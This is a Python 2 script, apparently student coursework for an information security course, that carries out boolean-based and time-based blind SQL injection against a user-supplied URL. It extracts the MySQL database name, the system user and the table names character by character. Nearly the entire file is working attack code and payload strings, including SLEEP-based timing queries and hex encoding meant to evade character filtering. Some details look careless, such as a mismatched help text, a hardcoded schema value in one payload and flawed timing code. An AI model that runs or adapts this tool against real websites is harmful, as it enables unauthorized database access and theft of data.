import urllib2, urllib, hashlib, argparse, random, datetime
"""
    Project Sql injection
    Iraklis Symeonidis
    MTE 1132
    Under the purpose of course ..
    At Msc Digital Informantion Security
"""

"""
OpenUrlConnection function is responsible for managing HTTP connections.
It takes two arguments as input, 
    base_url: the vulnerable url to SQL injection 
    blind_sqli_url: the concat Url that applies the sql injection
"""
def OpenUrlConnection(base_url,blind_sqli_url):
    #Converts to Url encoding. 
    #Replace letters, digits, and the characters '_.-' with special characters in string using the %xx escape. 
    blind_sqli_url_quoted = urllib.quote_plus(blind_sqli_url)
    #concat urls
    url = base_url + blind_sqli_url_quoted
    #create request for the entire path
    url_request = urllib2.Request(url)
    #if the base_url is correct url_response return the content of the website.
    #Otherwise returns a specific error. 
    try: 
        url_response = urllib2.urlopen(url_request)
    except urllib2.HTTPError, e:
        print'HTTPError = ' + str(e.code)
    except urllib2.URLError, e:
        print 'URLError = ' + str(e.reason)
    return (url_response.read())

"""
BlindSqli is the core function of this script
Input: takes three values as input
    base_url: is the vulnerable url
    payload: the sql query that apply the sql injection
    multiple_values: if the result have more than one result
Process: Search character by character the ascii map, from 32 to 127 and check if the result is the same as a != True result (False) of a page.
    if it is, then if the process needs to end or to continue for the next character
Output: Return the result character to character of wait for the process to complete and then print the results.
"""
def BlindSqli(base_url, payload, multiple_values):
    print "[SQL injection query]: " + payload
    #Returns a page not found and hashes the result. false_url_hash Variable used to compare and find the SQL injection "point"
    false_url_hash = hash_url(OpenUrlConnection(base_url, " AND false"))
    #indicate the position of the character finding
    character_position = 1
    #indicate at multivalue conditions the next phrase - word
    multivalue_position = 1
    #this variable is used to check the end of the search process.
    #If the process goes to an endless loop this indicator is a metric tool
    multivalue_indicator = 1
    #Indicates the number of characters for the succesive phrase/word finding
    finding_num = 0
    #value flag that indicates if the process needs to end (True). By default is False.
    flag_finish = False
    #Is a string that append the results of the process character by character
    string_append = ""
    #While flag_finish is False, while continue to loop.
    while (flag_finish != True):
        #ascii_decimal_num takes values from 32 to 126.
        for ascii_decimal_num in range(32,127):
            #Check if the script needs to return multiple values
            if multiple_values == True:
                #Variable blind_sqli_url store the result of the dynamic variable assignment
                blind_sqli_url =  payload % (str(character_position),str(multivalue_position),str(ascii_decimal_num))
            else:
                blind_sqli_url =  payload % (str(character_position),str(ascii_decimal_num))
            #Variable result_url_content stores the result of the url request
            result_url_content = OpenUrlConnection(base_url,blind_sqli_url)
            #if this request is false this means that we have a blind sql injection and we must do something about this
            if (hash_url(result_url_content) == false_url_hash):
                #we store the character converted from int to char
                character = chr(ascii_decimal_num)
                #we will go for the next one
                character_position +=1
                #this condition check if range function has start again to count
                if ascii_decimal_num == 32:
                    if multiple_values == False:
                        #if we have a single value we go off at the second loop and we set the flag_finish to trigger a stop, to finish the process
                        flag_finish = True
                        break
                    #if multiple values is set to True then we should search for the next phrase/word
                    elif multiple_values == True:
                        #Variable multivalue_indicator if it is greater than 1 then we have detect an endless loop and we should finish the process
                        if multivalue_indicator >1:
                            #if the multivalue_indicator == 1 then we go for the next phrase//word. Else we found an endless loop and need to break.
                            flag_finish = True
                            break
                        #set character_position to the first position of the phrase/word
                        character_position = 1
                        #increase the  multivalue_position pointing to the next phrase/word
                        multivalue_position += 1
                        #increase the endless loop indicator
                        multivalue_indicator += 1
                        string_append += ", "
                        #new word/phrase is going to be search, so we set the indicator to 0
                        finding_num = 0
                    #just print a new line
                    print ""                      
                else:
                    #increase the number of character found
                    finding_num += 1
                    print "[finding %d]: %s" % (finding_num,character)
                    string_append += character
                break
            else:
                ascii_decimal_num +=1
                multivalue_indicator = 1
    return string_append

"""
Hash_url takes url content of a page,
creates the hash md5 digest and return this value
"""
def hash_url(url):
    
    url_hash= hashlib.md5()
    #takes the url creates a hash_digest
    url_hash.update(url)
    return url_hash.digest()

"""
Notes: don't take into account
PATTERN ~1 " AND ORD(MID((IFNULL(CAST("+mysql_command+" AS CHAR),CHAR(32))),%s,1)) > %s"
PATTERN ~2 " AND ASCII(SUBSTRING("+mysql_command+",%s,1))> %s"
"""
"""
Function shell_operator_selector is used to process operators from shell
Input: it takes input from shell
Process: Assign specific values relevant to input operator
Output:
    args.target_url: is a variable that stores the url from shell
    payload: the vulnerable SQLi query
    multiple_values: indicates if the BlindSqli function needs to search for more than one values (words/phrases)
"""
def shell_operator_selector():
    print "===================Initializing SQL injection==================="
    randnum = random.randint(1, 1000)
    #different cases this script implement
    if  args.database:
        multiple_values = False
        mysql_command = 'database()'
        if args.technique == 'B':
            payload = " AND ASCII(SUBSTRING("+mysql_command+",%s,1))> %s"
        elif args.technique == 'T':
            payload = " AND "+str(randnum)+" = IF(ASCII(SUBSTRING("+mysql_command+",%s,1))> %s,"+str(randnum)+",SLEEP(2))"
    elif args.system_user:
        multiple_values = False
        mysql_command = 'system_user()'
        if args.technique == 'B':
            payload = " AND ASCII(SUBSTRING("+mysql_command+",%s,1))> %s"
        elif args.technique == 'T':
            payload = " AND "+str(randnum)+" = IF(ASCII(SUBSTRING("+mysql_command+",%s,1))> %s,"+str(randnum)+",SLEEP(2))"
    elif args.dump_tables:
        #This script dump db tables from the current db providing a little more level of complexity
        #dump tables means more than one results
        multiple_values = True
        #To dump all the tables from a database we should find the current database.
        print "=========[First Step: Find Used DB]========="
        mysql_command = 'database()'
        if args.technique == 'B':
            payload = " AND ASCII(SUBSTRING("+mysql_command+",%s,1))> %s"
        elif args.technique == 'T':
            payload = " AND "+str(randnum)+" = IF(ASCII(SUBSTRING("+mysql_command+",%s,1))> %s,"+str(randnum)+",SLEEP(2))"
        #convert the result (Database Name) to hex avoiding the detection of slash and other bad characters
        db_name = "0x"+BlindSqli(args.target_url, payload, False).encode("hex")
        print ""
        if args.technique == 'B':
            payload = " AND (select ASCII(SUBSTRING(a.table_name,%s,1)) FROM (select table_name, @rownum:=@rownum+1 as rownum from information_schema.tables, (select @rownum:=0)r WHERE table_schema="+db_name+")a where a.rownum=%s)>%s"
        elif args.technique == 'T':
            payload = " AND "+str(randnum)+" = IF((select ASCII(SUBSTRING(a.table_name,%s,1)) FROM (select table_name, @rownum:=@rownum+1 as rownum from information_schema.tables, (select @rownum:=0)r WHERE table_schema=0x4C30324442)a where a.rownum=%s)>%s,"+str(randnum)+",SLEEP(2))"
    else:
        print "Type -h or --help for the manual"
    return (args.target_url, payload, multiple_values)

#set the start_time of the process. Is used by Blind_sqli function.
#start time of process
start_time = datetime.datetime.now()
"""
Define the operators that will be available from shell
"""
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="calculate X to the power of Y")
    parser.add_argument("-u", "--url", dest = "target_url", type = str, help="Specify the vulnerable url")
    parser.add_argument("-t", "--tables", action = "store_true", dest = "dump_tables", help = "Enumerate DBMS database tables")
    parser.add_argument("-d", "--database", action = "store_true", dest = "database", help = "Enumerate DBMS database tables")
    parser.add_argument("-su", "--system-user", action = "store_true", dest = "system_user", help = "Enumerate DBMS database tables")
    parser.add_argument("--technique", action="store", choices = ['T', 'B'], dest = "technique", help="Specify which SQL injection type to test for. T: Time-based blind,B: Boolean-based blind")
    parser.add_argument('--version', '-v', action='version', version='Program:%(prog)s Version: 1.0')
    args = parser.parse_args()
    #shell_operator_selector is used to process operators from shell and returns three values.
    [base_url, payload, multiple_values] = shell_operator_selector()
  
"""
BlindSqli is the core function. It takes three inputs
    base_url: is the vulnerable url
    payload: the sql query that apply the sql injection
    multiple_values: if the result have more than one result
And print the successive result of findings
"""
sqli_result = BlindSqli(base_url, payload, multiple_values)
#end time of process
end_time = datetime.datetime.now()
#prints the results of sql injection
print "[Result of SQLi]: " + sqli_result
#print the overall process time
print "Minutes: %d, Seconds: %d" % (abs(end_time.minute - start_time.minute),abs(end_time.second - start_time.second))
